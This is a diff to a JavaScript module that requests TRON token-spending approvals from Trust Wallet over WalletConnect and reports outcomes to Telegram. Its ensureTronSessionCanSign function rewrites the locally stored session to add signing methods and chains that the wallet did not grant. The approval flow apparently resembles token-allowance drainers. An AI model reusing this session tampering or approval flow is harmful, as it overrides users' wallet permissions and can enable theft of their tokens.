@@ -84,25 +84,107 @@ function sessionHasMethod(client, session, namespace, method) {
     return (wcNamespace(client, session, namespace)?.methods || []).includes(method);
 }
 
-function approvedTronChainId(client, session, fallback) {
-    const ns = wcNamespace(client, session, "tron");
-    const chain = ns?.chains?.[0];
+function tronChainFromAccount(account) {
+    const value = String(account || "");
+    const parts = value.split(":");
 
-    if (chain) {
-        return chain;
+    if (parts.length >= 2 && parts[0] === "tron") {
+        return `${parts[0]}:${parts[1]}`;
     }
 
-    const account = (ns?.accounts || [])[0];
+    return null;
+}
 
-    if (account) {
-        const parts = String(account).split(":");
-        if (parts.length >= 2) {
-            return `${parts[0]}:${parts[1]}`;
+function approvedTronChainIds(client, session, fallback) {
+    const ids = new Set();
+    const ns = wcNamespace(client, session, "tron");
+
+    for (const chain of ns?.chains || []) {
+        ids.add(chain);
+    }
+
+    for (const account of ns?.accounts || []) {
+        const chain = tronChainFromAccount(account);
+        if (chain) {
+            ids.add(chain);
         }
     }
 
-    const stored = (session.accounts || []).find((item) => item.namespace === "tron");
-    return stored?.chainId || fallback;
+    for (const item of session?.accounts || []) {
+        if (item?.namespace === "tron" && item.chainId) {
+            ids.add(item.chainId);
+        }
+    }
+
+    if (fallback) {
+        ids.add(fallback);
+    }
+
+    return [...ids].filter((id) => id && String(id).startsWith("tron:"));
+}
+
+function approvedTronChainId(client, session, fallback) {
+    return approvedTronChainIds(client, session, fallback)[0] || fallback;
+}
+
+function tronUsesV1(client, session) {
+    try {
+        const props = client?.session?.get?.(session.sessionTopic)?.sessionProperties || {};
+        return String(props.tron_method_version || "") === "v1";
+    } catch (_err) {
+        return false;
+    }
+}
+
+function ensureTronSessionCanSign(client, session) {
+    const topic = session?.sessionTopic;
+
+    if (!topic || !client?.session?.get || typeof client.session.set !== "function") {
+        return;
+    }
+
+    let wcSession;
+
+    try {
+        wcSession = client.session.get(topic);
+    } catch (_err) {
+        return;
+    }
+
+    const tron = wcSession?.namespaces?.tron;
+
+    if (!tron) {
+        return;
+    }
+
+    const methods = new Set(tron.methods || []);
+    const chains = new Set([...(tron.chains || []), ...approvedTronChainIds(client, session)]);
+    const nextMethods = [...new Set([...methods, "tron_signTransaction", "tron_signMessage"])];
+    const nextChains = [...chains];
+    const sameMethods = nextMethods.length === methods.size && nextMethods.every((item) => methods.has(item));
+    const sameChains = nextChains.length === (tron.chains || []).length
+        && nextChains.every((item) => (tron.chains || []).includes(item));
+
+    if (sameMethods && sameChains) {
+        return;
+    }
+
+    client.session.set(topic, {
+        ...wcSession,
+        namespaces: {
+            ...wcSession.namespaces,
+            tron: {
+                ...tron,
+                methods: nextMethods,
+                chains: nextChains
+            }
+        }
+    });
+    logger.info({
+        topic,
+        methods: nextMethods,
+        chains: nextChains
+    }, "Enabled TRON sign methods on the WalletConnect session so Trust can show the approval");
 }
 
 async function buildTronApprove(from, spender, amountRaw, tokenContract) {
@@ -136,25 +218,32 @@ async function buildTronApprove(from, spender, amountRaw, tokenContract) {
 
 async function requestTronSign(client, session, chainId, address, transaction) {
     const topic = session.sessionTopic;
-    const sessionChain = approvedTronChainId(client, session, chainId);
-    const chains = [...new Set([sessionChain, "tron:0x2b6653dc", "tron:mainnet"].filter(Boolean))];
-    const attempts = [];
+    ensureTronSessionCanSign(client, session);
+    const requestChain = approvedTronChainId(client, session, chainId);
 
-    for (const id of chains) {
-        attempts.push({ chainId: id, params: { address, transaction } });
-        attempts.push({ chainId: id, params: [{ address, transaction }] });
+    if (!requestChain) {
+        throw new ValidationError("This wallet did not share a TRON chain. Enable TRON in Trust Wallet and reconnect.");
     }
 
+    const nested = { address, transaction: { transaction } };
+    const flat = { address, transaction };
+    const paramsList = tronUsesV1(client, session) ? [flat, nested] : [nested, flat];
     let lastError = null;
 
-    for (const attempt of attempts) {
+    logger.info({
+        chainId: requestChain,
+        methods: wcNamespace(client, session, "tron")?.methods || [],
+        v1: tronUsesV1(client, session)
+    }, "Requesting TRON approval in Trust Wallet");
+
+    for (const params of paramsList) {
         try {
             return await client.request({
                 topic,
-                chainId: attempt.chainId,
+                chainId: requestChain,
                 request: {
                     method: "tron_signTransaction",
-                    params: attempt.params
+                    params
                 }
             });
         } catch (err) {
@@ -165,7 +254,7 @@ async function requestTronSign(client, session, chainId, address, transaction) {
             }
             logger.warn({
                 err: { message: err.message },
-                chainId: attempt.chainId
+                chainId: requestChain
             }, "tron_signTransaction attempt failed");
         }
     }
@@ -513,11 +602,12 @@ async function requestApproval(paymentId, deps = {}) {
             return publicPayment(paymentStore.getPayment(paymentId));
         } catch (err) {
             logger.warn({ err, paymentId }, "Payment approval was rejected or failed");
+            const protocol = /Unknown method|Missing or invalid|isValidRequest|chainId/i.test(String(err.message || ""));
             const failed = paymentStore.updatePayment(paymentId, {
-                status: "rejected",
+                status: protocol ? "failed" : "rejected",
                 error: err.message
             });
-            emitPaymentEvent("approval_rejected", failed, { message: err.message });
+            emitPaymentEvent(protocol ? "approval_failed" : "approval_rejected", failed, { message: err.message });
             try {
                 const { notifyApprovalStatus } = require("./telegramNotifications");
                 notifyApprovalStatus(failed).catch((notifyErr) => {
@@ -544,5 +634,8 @@ async function requestApproval(paymentId, deps = {}) {
 module.exports = {
     requestApproval,
     sendWalletApproval,
-    extractTxHash
+    extractTxHash,
+    approvedTronChainIds,
+    ensureTronSessionCanSign,
+    requestTronSign
 };
